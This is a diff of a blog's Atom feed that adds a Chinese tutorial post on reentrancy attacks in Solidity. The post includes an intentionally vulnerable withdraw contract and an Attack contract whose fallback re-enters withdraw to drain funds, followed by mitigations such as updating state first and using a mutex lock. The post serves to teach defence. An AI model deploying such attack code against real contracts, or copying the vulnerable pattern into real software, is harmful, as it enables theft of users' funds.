@@ -6,7 +6,7 @@
   <link href="http://blog.hoshinobunny.xyz/atom.xml" rel="self"/>
   
   <link href="http://blog.hoshinobunny.xyz/"/>
-  <updated>2025-02-12T10:16:11.740Z</updated>
+  <updated>2025-03-12T10:05:22.512Z</updated>
   <id>http://blog.hoshinobunny.xyz/</id>
   
   <author>
@@ -15,6 +15,36 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>重入攻击</title>
+    <link href="http://blog.hoshinobunny.xyz/2025/03/10/%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/"/>
+    <id>http://blog.hoshinobunny.xyz/2025/03/10/%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/</id>
+    <published>2025-03-10T10:04:52.000Z</published>
+    <updated>2025-03-12T10:05:22.512Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="什么是重入攻击？"><a href="#什么是重入攻击？" class="headerlink" title="什么是重入攻击？"></a>什么是重入攻击？</h1><p>重入攻击（Reentrancy Attack）是区块链智能合约中的一种常见安全漏洞，尤其在以太坊等支持智能合约的区块链平台中较为突出。它发生在<strong>一个合约在调用另一个合约（或地址）的函数时，未更新自身状态之前，对方合约又重新调用原合约的函数</strong>，从而导致逻辑被重复执行，进而被恶意利用。</p><h2 id="举一个经典例子"><a href="#举一个经典例子" class="headerlink" title="举一个经典例子"></a>举一个经典例子</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">contract Vulnerable &#123;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint amount = balances[msg.sender];</span><br><span class="line">        require(amount &gt; 0);</span><br><span class="line"></span><br><span class="line">        // 向用户发送 ETH</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success);</span><br><span class="line"></span><br><span class="line">        // ⚠️ 问题在这里：在转账之后才修改状态</span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的攻击合约就能通过<code>fallback</code> 回调函数发起<code>重入攻击</code> 从而盗取<code>Vulnerable</code> 账户中的所有资金。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;./Vulnerable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address owner;</span><br><span class="line">    Vulnerable public vault;</span><br><span class="line"></span><br><span class="line">    constructor(address _vault) &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        vault = Vulnerable(payable(_vault));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">     function attack() public &#123;</span><br><span class="line">        vault.deposite&#123;value: 0.1 ether&#125;();</span><br><span class="line">        vault.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">// 通过回调函数发起重入攻击，盗取目标合约的所有资金</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        if (address(vault).balance &gt; 0) &#123;</span><br><span class="line">            vault.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        if (msg.sender == owner) &#123;</span><br><span class="line">            payable(msg.sender).transfer(address(this).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当攻击者通过<code>Attack</code> 方法先向目标合约存入一笔资金，随后取款，在目标合约进行转账的时候使用<code>msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</code> 会调用到<code>Attack</code> 中的回调函数，而回调函数会再次调用取款函数，由于目标合约中的 <code>balances[msg.sender]</code> 在此时任然没有被修改为0，这就导致攻击者可以一直触发转账，直到账户中资金为0。</p><h1 id="如何解决？"><a href="#如何解决？" class="headerlink" title="如何解决？"></a>如何解决？</h1><h2 id="先修改状态变量"><a href="#先修改状态变量" class="headerlink" title="先修改状态变量"></a>先修改状态变量</h2><p>在取款函数中，先修改状态变量再进行转账操作即可防止重入攻击。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function withdraw() public &#123;</span><br><span class="line">    uint amount = balances[msg.sender];</span><br><span class="line">    require(amount &gt; 0);</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] = 0; // ✅ 先修改状态</span><br><span class="line">    (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">    require(success);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用互斥锁"><a href="#使用互斥锁" class="headerlink" title="使用互斥锁"></a>使用互斥锁</h2><p>在同一次交易调用中，对取款函数的状态加锁，如果攻击者试图在回调函数中再次调用取款函数，就会因为<code>locked</code> 变量无法重复调用。</p><p>openzeppelin已经给出<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuardTransient.sol">最佳实现</a>。</p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuardTransient.sol">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuardTransient.sol</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bool internal locked;</span><br><span class="line">modifier noReentrant() &#123;</span><br><span class="line">    require(!locked, &quot;No reentrancy&quot;);</span><br><span class="line">    locked = true;</span><br><span class="line">    _;</span><br><span class="line">    locked = false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function withdraw() public noReentrant &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="限制调用方式（比如用-transfer-或-send-限制-gas）"><a href="#限制调用方式（比如用-transfer-或-send-限制-gas）" class="headerlink" title="限制调用方式（比如用 transfer 或 send 限制 gas）"></a><strong>限制调用方式（比如用 transfer 或 send 限制 gas）</strong></h1><p>不推荐长期使用这种方式，现在很多攻击已经绕过<code>gas</code>限制了。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;什么是重入攻击？&quot;&gt;&lt;a href=&quot;#什么是重入攻击？&quot; class=&quot;headerlink&quot; title=&quot;什么是重入攻击？&quot;&gt;&lt;/a&gt;什么是重入攻击？&lt;/h1&gt;&lt;p&gt;重入攻击（Reentrancy Attack）是区块链智能合约中的一种常见安全漏洞，尤其在以</summary>
+      
+    
+    
+    
+    <category term="Coding" scheme="http://blog.hoshinobunny.xyz/categories/Coding/"/>
+    
+    
+    <category term="学习记录" scheme="http://blog.hoshinobunny.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
+    
+    <category term="区块链" scheme="http://blog.hoshinobunny.xyz/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
+    
+    <category term="Solidity" scheme="http://blog.hoshinobunny.xyz/tags/Solidity/"/>
+    
+    <category term="合约安全" scheme="http://blog.hoshinobunny.xyz/tags/%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>部署第一个合约</title>
@@ -92,11 +122,11 @@
     <category term="Coding" scheme="http://blog.hoshinobunny.xyz/categories/Coding/"/>
     
     
-    <category term="学习记录" scheme="http://blog.hoshinobunny.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
-    
     <category term="踩坑" scheme="http://blog.hoshinobunny.xyz/tags/%E8%B8%A9%E5%9D%91/"/>
     
     <category term="前端" scheme="http://blog.hoshinobunny.xyz/tags/%E5%89%8D%E7%AB%AF/"/>
+    
+    <category term="学习记录" scheme="http://blog.hoshinobunny.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
     
   </entry>
   
